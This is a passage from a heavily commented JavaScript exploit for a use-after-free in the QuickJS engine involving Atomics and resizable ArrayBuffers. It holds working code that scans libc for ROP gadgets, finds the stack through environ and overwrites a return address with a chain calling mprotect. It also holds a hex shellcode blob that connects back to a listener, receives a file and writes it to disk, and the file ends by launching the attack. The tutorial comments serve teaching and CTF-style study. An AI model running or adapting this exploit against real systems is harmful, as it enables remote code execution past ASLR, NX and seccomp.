 *   | shellcode addr   | <- mprotect returns here = our shellcode!
 *   +------------------+
 *
 * When the original function returns:
 * 1. RET pops gadget1 addr, jumps there
 * 2. Gadget1: "pop rdi; ret" - pops next value into RDI, RETs to gadget2
 * 3. Gadget2: "pop rsi; ret" - pops next value into RSI, RETs to gadget3
 * 4. ... eventually RET to mprotect
 * 5. mprotect executes with our chosen arguments
 * 6. mprotect returns to shellcode address
 * 7. Shellcode executes!
 *
 * WHY THESE GADGETS?
 * -----------------
 * x86_64 calling convention: first 6 arguments go in registers:
 *   RDI = 1st argument
 *   RSI = 2nd argument
 *   RDX = 3rd argument
 *   RCX = 4th argument
 *   R8  = 5th argument
 *   R9  = 6th argument
 *
 * For mprotect(void *addr, size_t len, int prot):
 *   RDI = addr (page to make executable)
 *   RSI = len (size, typically 0x1000 = one page)
 *   RDX = prot (7 = PROT_READ | PROT_WRITE | PROT_EXEC)
 */

/*
 * Find a specific byte sequence (gadget) in executable memory.
 *
 * Parameters:
 *   view: arbitrary read view covering the search region
 *   start, end: address range to search
 *   bytes: array of byte values to find (e.g., [0x5f, 0xc3] for "pop rdi; ret")
 *
 * Returns: address of gadget, or 0n if not found
 *
 * ALGORITHM:
 * ---------
 * We read memory in 8-byte chunks (64-bit words) and check each byte position
 * for the pattern. Since gadgets can span word boundaries, we read two
 * consecutive words and search within their combined 16 bytes.
 */
function find_gadget(view, start, end, bytes) {
  let patLen = bytes.length;

  /*
   * Convert byte array to a single BigInt for fast comparison.
   * E.g., [0x5f, 0xc3] becomes 0xc35fn (little-endian)
   */
  let pat = 0n;
  for (let i = 0; i < patLen; i++)
    pat |= BigInt(bytes[i]) << BigInt(i * 8);

  // Mask for extracting patLen bytes
  let mask = (1n << BigInt(patLen * 8)) - 1n;

  let s = start;
  let e = end - BigInt(patLen);

  // Convert addresses to array indices
  let first = Number((s - view.base) >> 3n);
  let last = Number((e - view.base) >> 3n);
  if (first < 0) first = 0;
  let n = view.victim.length;
  if (last > n - 2) last = n - 2;  // Need to read two consecutive words

  /*
   * Scan through memory, checking each byte position.
   * We combine two 64-bit words into a 128-bit value to handle
   * patterns that cross 8-byte boundaries.
   */
  for (let i = first; i <= last; i++) {
    let w0 = u64(view.victim[i]);
    let w1 = u64(view.victim[i + 1]);
    let combo = w0 | (w1 << 64n);  // 128-bit combined value

    // Check each byte position within the first word
    for (let pos = 0; pos < 8; pos++) {
      let v = (combo >> BigInt(pos * 8)) & mask;
      if (v === pat) {
        let addr = view.base + BigInt(i * 8 + pos);
        if (addr >= start && addr <= e) return addr;
      }
    }
  }

  return 0n;  // Not found
}

/*
 * Find a "pop rdx" gadget. RDX is tricky because simple "pop rdx; ret"
 * is less common. We try several variants.
 *
 * Variants:
 * - 0x5a 0xc3: pop rdx; ret
 * - 0x5a 0x5b 0xc3: pop rdx; pop rbx; ret (pops extra value)
 * - 0x5a 0x41 0x5c 0xc3: pop rdx; pop r12; ret (also pops extra value)
 *
 * Returns { addr, extra } where 'extra' is how many additional values
 * the gadget pops (need to put padding on stack for these).
 */
function find_pop_rdx(view, start, end) {
  // Try simplest gadget first
  let a = find_gadget(view, start, end, [0x5a, 0xc3]);
  if (a) return { addr: a, extra: 0 };

  // pop rdx; pop rbx; ret - need 1 extra stack slot
  a = find_gadget(view, start, end, [0x5a, 0x5b, 0xc3]);
  if (a) return { addr: a, extra: 1 };

  // pop rdx; pop r12; ret - need 1 extra stack slot
  a = find_gadget(view, start, end, [0x5a, 0x41, 0x5c, 0xc3]);
  if (a) return { addr: a, extra: 1 };

  return { addr: 0n, extra: 0 };
}

// ============================================================================
// EXPLOIT STAGE 6: FIND AND CORRUPT THE STACK
// ============================================================================

/*
 * FINDING THE STACK:
 * =================
 *
 * We need to find where the stack is in memory to overwrite return addresses.
 * ASLR randomizes the stack location, but libc provides a way to find it!
 *
 * THE 'environ' VARIABLE:
 * ----------------------
 * libc exports a global variable called 'environ' (char **environ).
 * This is a pointer to the environment variable array (envp).
 *
 * Memory layout at program start:
 *
 *   +------------------+ High addresses (stack grows down)
 *   | environ strings  |  "PATH=/usr/bin", "HOME=/home/user", etc.
 *   +------------------+
 *   | NULL             |  End of envp array
 *   +------------------+
 *   | envp[n]          |  Pointer to last env string
 *   +------------------+
 *   | ...              |
 *   +------------------+
 *   | envp[0]          |  Pointer to first env string <-- environ points here
 *   +------------------+
 *   | NULL             |  End of argv array
 *   +------------------+
 *   | argv[argc-1]     |
 *   +------------------+
 *   | ...              |
 *   +------------------+
 *   | argv[0]          |
 *   +------------------+
 *   | argc             |
 *   +------------------+
 *   | return address   |  Return to libc_start_main
 *   +------------------+
 *   | saved RBP        |
 *   +------------------+
 *   | local variables  |  main()'s stack frame
 *   +------------------+ Low addresses
 *
 * So: environ -> envp[0] -> env string -> gives us a stack address!
 */

/*
 * Check if an instruction at 'addr' is a "call *reg" (indirect call through
 * register) followed by our return point.
 *
 * When the JS engine calls our valueOf(), it uses an indirect call:
 *   call *rax    ; or call *rbx, etc.
 *
 * The return address pushed by this CALL points right after the CALL instruction.
 * We look for this pattern to identify return addresses on the stack that
 * belong to the JS engine's call stack.
 *
 * x86_64 encoding for "call *reg":
 *   ff d0 = call *rax
 *   ff d1 = call *rcx
 *   ...
 *   ff d7 = call *rdi
 *
 * May have REX prefix (40-4f) before the ff.
 *
 * We check the bytes BEFORE the return address to see if they form this pattern.
 */
function is_call_reg_ret(textView, addr) {
  // Check 2-byte encoding: ff d0-d7
  let b1 = read_u8(textView, addr - 2n);
  let b2 = read_u8(textView, addr - 1n);
  if (b1 === 0xff && (b2 & 0xf8) === 0xd0) return true;

  // Check 3-byte encoding with REX prefix: 4? ff d0-d7
  let b0 = read_u8(textView, addr - 3n);
  if ((b0 & 0xf0) === 0x40 && b1 === 0xff && (b2 & 0xf8) === 0xd0) return true;

  return false;
}

/*
 * Find a return address slot on the stack that we can overwrite.
 *
 * We scan the stack for pointers into libc's text segment that look like
 * return addresses (preceded by an indirect call instruction).
 *
 * WHY LIBC'S TEXT?
 * ---------------
 * When QuickJS runs our JavaScript, it eventually calls libc functions
 * (for memory allocation, etc.). Each call pushes a return address.
 * We find one of these return addresses (pointing into libc) and overwrite it.
 *
 * When that libc function returns, instead of returning to QuickJS,
 * it "returns" into our ROP chain!
 *
 * We scan from high addresses (bottom of stack) toward lower addresses,
 * looking for a suitable return address to hijack.
 */
function find_main_ret_slot(stackView, textView, textStart, textEnd) {
  let n = stackView.victim.length;

  /*
   * Scan from high addresses down (stack grows toward lower addresses,
   * so "bottom" of stack is higher addresses).
   */
  for (let i = n - 1; i >= 0; i--) {
    let v = u64(stackView.victim[i]);

    // Check if this looks like a code pointer in the text segment
    if (v >= textStart && v < textEnd) {
      // Verify it's preceded by a call instruction
      if (is_call_reg_ret(textView, v)) return i;
    }
  }

  return -1;  // Not found
}

// ============================================================================
// EXPLOIT STAGE 7: SHELLCODE AND ROP CHAIN
// ============================================================================

/*
 * SHELLCODE EXPLAINED:
 * ===================
 *
 * Shellcode is raw machine code that does something useful for the attacker.
 * This shellcode establishes a "reverse shell" - it connects back to the
 * attacker's server and allows remote command execution.
 *
 * WHY SHELLCODE INSTEAD OF CALLING EXECVE?
 * ----------------------------------------
 * This target has seccomp (Secure Computing Mode) enabled, which restricts
 * which system calls can be made.
 *
 * WHAT IS SECCOMP?
 * ---------------
 * seccomp is a Linux kernel feature that filters syscalls. The program
 * installs a filter specifying which syscalls are allowed. Any syscall
 * not in the whitelist is blocked (process is killed or syscall fails).
 *
 * Common blocked syscalls in sandboxes:
 * - execve: Spawn new processes (would allow /bin/sh)
 * - fork/clone: Create child processes
 * - ptrace: Debug other processes
 *
 * The execve() syscall (which spawns new processes) is blocked here.
 * So we can't just call system("/bin/sh") or execve("/bin/sh", ...).
 *
 * Instead, our shellcode:
 * 1. Creates a TCP socket and connects to attacker's server (127.0.0.1:9999)
 * 2. Receives a filename and file contents from the server
 * 3. Writes the file to disk
 * 4. This proves code execution and can exfiltrate data
 *
 * SHELLCODE WALKTHROUGH (disassembly of SC_HEX):
 * ---------------------------------------------
 *
 *   ; socket(AF_INET=2, SOCK_STREAM=1, 0)
 *   mov eax, 41           ; __NR_socket = 41
 *   mov edi, 2            ; AF_INET
 *   mov esi, 1            ; SOCK_STREAM
 *   xor edx, edx          ; protocol = 0
 *   syscall
 *   mov r12, rax          ; save socket fd
 *
 *   ; Set up sockaddr_in structure on stack
 *   sub rsp, 0x20
 *   mov word [rsp], 2           ; sin_family = AF_INET
 *   mov word [rsp+2], 0x0f27    ; sin_port = 9999 (big-endian: 0x270f)
 *   mov dword [rsp+4], 0x0100007f ; sin_addr = 127.0.0.1 (big-endian)
 *
 *   ; connect(sockfd, &sockaddr, 16)
 *   mov eax, 42           ; __NR_connect = 42
 *   mov edi, r12d         ; socket fd
 *   lea rsi, [rsp]        ; sockaddr pointer
 *   mov edx, 16           ; sizeof(sockaddr_in)
 *   syscall
 *
 *   ; Read filename length, filename, content length, content from socket
 *   ; Write received content to file
 *   ; (detailed recv/write loops omitted for brevity)
 *
 *   ; exit(0)
 *   mov eax, 60           ; __NR_exit = 60
 *   xor edi, edi          ; status = 0
 *   syscall
 *
 * The shellcode is position-independent (no hardcoded addresses) so it
 * can run from any memory location.
 */
const SC_HEX = 'b829000000bf02000000be0100000031d20f054989c44883ec2066c70424020066c7442402270fc74424047f00000131c04889442408b82a0000004489e7488d3424ba100000000f054489e7488d742410ba04000000e89c0000008b5c24104881ec000400004989e54489e74c89ee89dae88100000041c6441d00004489e7498db500010000ba04000000e867000000458bbd00010000b801010000bf9cffffff4c89eeba4102000041baa40100000f054989c64489e7498db5200100004489fae831000000b8010000004489f7498db5200100004489fa0f05b8030000004489f70f05b8030000004489e70f05b83c00000031ff0f0531c04885d274120f054883f8007e0a4801c64829c231c0ebe9c3';

/*
 * Convert hexadecimal string to byte array.
 * "b829" -> [0xb8, 0x29]
 */
function hex_to_bytes(hex) {
  let out = [];
  for (let i = 0; i < hex.length; i += 2)
    out.push(parseInt(hex.slice(i, i + 2), 16));
  return out;
}

/*
 * Write shellcode to a memory page.
 *
 * We write to a location on the stack (the environment strings area).
 * After mprotect() makes it executable, we can jump to it.
 */
function write_shellcode(dstPage, dstAddr) {
  let bytes = hex_to_bytes(SC_HEX);
  let view = make_arb_u64_view(dstPage, 0x2000);
  let baseIdx = Number((dstAddr - dstPage) >> 3n);

  /*
   * Write shellcode 8 bytes at a time.
   * We convert bytes to 64-bit little-endian values.
   */
  for (let i = 0; i < bytes.length; i += 8) {
    let w = 0n;
    for (let j = 0; j < 8 && (i + j) < bytes.length; j++)
      w |= BigInt(bytes[i + j]) << BigInt(j * 8);
    view.victim[baseIdx + (i >> 3)] = u64(w);
  }
}

// ============================================================================
// MAIN EXPLOIT FUNCTION
// ============================================================================

/*
 * This is the main exploit function that ties everything together.
 *
 * COMPLETE EXPLOIT FLOW:
 * =====================
 *
 * 1. LEAK LIBC POINTER
 *    - Trigger UAF to read freed heap chunk
 *    - Get a pointer into libc's data section
 *
 * 2. FIND LIBC BASE
 *    - Scan backwards from leak for ELF magic
 *    - Now we know where libc is loaded
 *
 * 3. PARSE LIBC'S ELF HEADERS
 *    - Find text segment (code) boundaries
 *    - Find dynamic segment (symbol tables)
 *
 * 4. RESOLVE SYMBOLS
 *    - Find mprotect() address (to make memory executable)
 *    - Find environ address (to locate the stack)
 *
 * 5. FIND STACK ADDRESS
 *    - environ -> envp -> env string -> stack region
 *
 * 6. FIND ROP GADGETS
 *    - Search libc text for pop rdi; ret, pop rsi; ret, etc.
 *
 * 7. FIND RETURN ADDRESS SLOT
 *    - Scan stack for return addresses
 *    - Identify one we can overwrite
 *
 * 8. WRITE SHELLCODE
 *    - Place shellcode in environment strings area
 *
 * 9. BUILD AND WRITE ROP CHAIN
 *    - Overwrite return address with:
 *      [ret] (alignment)
 *      [pop rdi] [shellcode_page]
 *      [pop rsi] [0x1000]
 *      [pop rdx] [7]
 *      [mprotect]
 *      [shellcode_addr]
 *
 * 10. FUNCTION RETURNS
 *     - ROP chain executes
 *     - mprotect makes shellcode page executable
 *     - Jump to shellcode
 *     - Shellcode connects to attacker and sends data!
 */
function pwn() {
  // ==================== STAGE 1: Leak libc pointer ====================
  let leak = leak_libc_ptr();

  // ==================== STAGE 2: Find libc base ====================
  let libcBase = find_libc_base_from_ptr(leak);
  if (libcBase === 0n) return;  // Failed to find libc

  // ==================== STAGE 3: Parse ELF headers ====================
  let ph = parse_elf64_phdrs(libcBase);
  let dyn = parse_dynamic(ph.dynAddr, ph.dynSize);

  // ==================== STAGE 4: Resolve symbols ====================
  /*
   * mprotect(void *addr, size_t len, int prot):
   *   Changes memory protection. We'll use it to make shellcode executable.
   *   prot = 7 = PROT_READ(1) | PROT_WRITE(2) | PROT_EXEC(4)
   *
   * environ:
   *   Global variable pointing to environment pointer array.
   *   Gives us a stack address.
   */
  let mprotect = lookup_sym(libcBase, dyn, 'mprotect');
  let environ = lookup_sym(libcBase, dyn, 'environ');
  if (!mprotect || !environ) return;  // Symbols not found

  // ==================== STAGE 5: Find stack address ====================
  /*
   * Dereference chain: environ -> envp -> env0
   *
   * environ is a pointer (in libc's .data) to envp
   * envp is an array of pointers to environment strings
   * envp[0] points to the first environment string on the stack
   */
  let envView = make_arb_u64_view(environ & ~7n, 0x100);
  let envp = read_u64(envView, environ);  // Pointer to envp array

  let envpView = make_arb_u64_view(envp & ~7n, 0x1000);
  let env0 = read_u64(envpView, envp);  // First env string pointer

  /*
   * env0 points into the stack's environment strings area.
   * We'll put our shellcode there (it's writable, and we'll make it executable).
   */
  let sc_page = env0 & ~0xfffn;  // Align to page boundary
  let sc_addr = sc_page + 0x800n;  // Offset into page for shellcode

  // ==================== STAGE 6: Find ROP gadgets ====================
  /*
   * Create a view of libc's text segment for gadget scanning.
   */
  let textBase = ph.textStart & ~7n;
  let textLen = align8(Number(ph.textEnd - textBase));
  let textView = make_arb_u64_view(textBase, textLen + 0x100);

  /*
   * Find required gadgets:
   * - pop rdi; ret  [0x5f, 0xc3] - Set 1st argument
   * - pop rsi; ret  [0x5e, 0xc3] - Set 2nd argument
   * - pop rdx; ret  [0x5a, 0xc3] - Set 3rd argument (may have extra pops)
   * - ret           [0xc3]       - For stack alignment
   */
  let pop_rdi = find_gadget(textView, ph.textStart, ph.textEnd, [0x5f, 0xc3]);
  let pop_rsi = find_gadget(textView, ph.textStart, ph.textEnd, [0x5e, 0xc3]);
  let pop_rdx = find_pop_rdx(textView, ph.textStart, ph.textEnd);
  let ret = find_gadget(textView, ph.textStart, ph.textEnd, [0xc3]);

  if (!pop_rdi || !pop_rsi || !pop_rdx.addr || !ret) return;  // Gadgets not found

  // ==================== STAGE 7: Find return address on stack ====================
  /*
   * Scan the stack to find a return address we can overwrite.
   * We look for addresses pointing into libc's code that were
   * reached via an indirect call instruction.
   */
  const stackScan = 0x80000;  // 512KB stack scan range
  let stackBase = (envp - BigInt(stackScan)) & ~7n;
  let stackView = make_arb_u64_view(stackBase, stackScan);

  let ret_i = find_main_ret_slot(stackView, textView, ph.textStart, ph.textEnd);
  if (ret_i < 0) return;  // No suitable return address found

  // ==================== STAGE 8: Write shellcode ====================
  write_shellcode(sc_page, sc_addr);

  // ==================== STAGE 9: Install ROP chain ====================
  /*
   * The ROP chain calls: mprotect(sc_page, 0x1000, 7)
   * Then jumps to shellcode.
   *
   * Stack layout (each line is 8 bytes):
   *
   *   +------------------+ <- ret_i (overwritten return address)
   *   | ret gadget       |  Stack alignment (16-byte align before call)
   *   +------------------+
   *   | pop_rdi gadget   |  Will pop next value into RDI
   *   +------------------+
   *   | sc_page          |  1st arg: address to mprotect
   *   +------------------+
   *   | pop_rsi gadget   |  Will pop next value into RSI
   *   +------------------+
   *   | 0x1000           |  2nd arg: length (one page)
   *   +------------------+
   *   | pop_rdx gadget   |  Will pop next value into RDX
   *   +------------------+
   *   | 7                |  3rd arg: prot (RWX)
   *   +------------------+
   *   | (padding if      |  Extra pops from pop_rdx variant
   *   |  pop_rdx.extra)  |
   *   +------------------+
   *   | mprotect addr    |  Call mprotect with args in registers
   *   +------------------+
   *   | sc_addr          |  mprotect returns here = shellcode!
   *   +------------------+
   */
  let chain = [
    ret,          // Stack alignment (ensure 16-byte alignment for calls)
    pop_rdi, sc_page,    // RDI = shellcode page address
    pop_rsi, 0x1000n,    // RSI = one page (4096 bytes)
    pop_rdx.addr, 7n,    // RDX = PROT_READ | PROT_WRITE | PROT_EXEC
  ];

  // Add padding for any extra pops in the pop_rdx gadget
  for (let i = 0; i < pop_rdx.extra; i++) chain.push(0n);

  chain.push(mprotect);  // Call mprotect(sc_page, 0x1000, 7)
  chain.push(sc_addr);   // mprotect returns to shellcode!

  /*
   * Write the ROP chain to the stack, starting at the return address slot.
   */
  for (let j = 0; j < chain.length; j++) {
    stackView.victim[ret_i + j] = u64(chain[j]);
  }

  /*
   * When this function returns (and eventually the original JavaScript
   * function returns), the ROP chain executes:
   *
   * 1. ret gadget (stack alignment)
   * 2. pop rdi; ret -> RDI = sc_page
   * 3. pop rsi; ret -> RSI = 0x1000
   * 4. pop rdx; ret -> RDX = 7
   * 5. mprotect(sc_page, 0x1000, 7) makes shellcode executable
   * 6. mprotect returns to sc_addr
   * 7. SHELLCODE EXECUTES!
   * 8. Shellcode connects to 127.0.0.1:9999 and sends data
   * 9. Exploit complete!
   */
}

// ============================================================================
// LAUNCH THE EXPLOIT
// ============================================================================

/*
 * Call the main exploit function.
 * If everything works:
 * 1. We leak a libc pointer
 * 2. Find libc base and parse its symbols
 * 3. Find the stack and ROP gadgets
 * 4. Write shellcode and ROP chain
 * 5. When pwn() returns, ROP chain makes shellcode executable
 * 6. Shellcode connects back to attacker's server
 */
pwn();

/*
 * ============================================================================
 * SUMMARY
 * ============================================================================
 *
 * This exploit demonstrates a complete attack chain:
 *
 * VULNERABILITY: Use-after-free in Atomics + Resizable ArrayBuffer
 *   - Atomics.store/add gets pointer before valueOf() callback
 *   - valueOf() can resize buffer, freeing the memory
 *   - Stale pointer allows read/write to freed memory
 *
 * EXPLOITATION:
 *   1. Read freed chunk metadata to leak libc pointer
 *   2. Corrupt TypedArray to create arbitrary read/write
 *   3. Parse ELF to find libc functions and gadgets
 *   4. Find stack via environ symbol
 *   5. Build ROP chain to call mprotect()
 *   6. Execute shellcode via ROP
 *
 * DEFENSES THIS BYPASSES:
 *   - ASLR: Defeated by leaking libc pointer and scanning for ELF header
 *   - NX (No-Execute): Defeated by ROP + mprotect to make memory executable
 *   - Seccomp: Avoided by not using blocked syscalls (no execve)
 *
 * DEFENSES THAT WOULD STOP THIS:
 *   - CFI (Control Flow Integrity): Would detect corrupted return addresses
 *   - Shadow Stack: Hardware-enforced return address integrity
 *   - Memory tagging: Would detect use-after-free
 *
 * ============================================================================
 */
